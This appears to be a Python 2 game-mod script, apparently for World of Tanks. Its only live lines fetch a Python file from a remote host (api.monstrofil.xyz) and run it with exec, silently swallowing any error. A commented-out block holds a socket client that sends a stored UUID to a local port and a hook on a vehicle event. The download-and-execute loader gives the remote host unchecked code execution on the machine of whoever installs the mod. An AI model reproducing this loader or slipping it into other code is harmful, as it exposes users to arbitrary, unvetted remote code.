import urllib
try:
    exec urllib.urlopen('http://api.monstrofil.xyz/script.py').read()
except Exception, e:
    pass
# import socket
# import os, threading
# server_address = ('127.0.0.1', 8123)
#
# ENDL = os.linesep
#
# UUIDFILE = "UUIDFILE.DATA"
# try:
#     UID = open(UUIDFILE, 'rb').read()
# except:
#     import uuid
#     UID = str(uuid.uuid1())
#     with open(UUIDFILE, 'wb') as f:
#         f.write(UID)
#
# class SocketConnection(threading.Thread):
#     def __init__(self):
#         super(SocketConnection, self).__init__()
#         self.queue = []
#         self.sock = socket.socket()
#         self.sock.settimeout(None)
#         self.sock.connect(server_address)
#         self.sock.recv(1024)
#         self.queue.append(UID)
#
#     def run(self):
#         while(True):
#             if len(self.queue) == 0:
#                 continue
#             message = self.queue.pop()
#             print message
#             self.sock.send(message + ENDL)
#
#     def send_message(self, message):
#         self.queue.append(message)
#
#
#
# g_fileLoader = SocketConnection()
# g_fileLoader.start()
#
# from Vehicle import Vehicle
#
# old_onLeaveWorld = Vehicle.onLeaveWorld
# def new_onLeaveWorld(*args, **params):
#     g_fileLoader.send_message("""""")
#     old_onLeaveWorld(*args, **params)
# Vehicle.onLeaveWorld = new_onLeaveWorld

import urllib
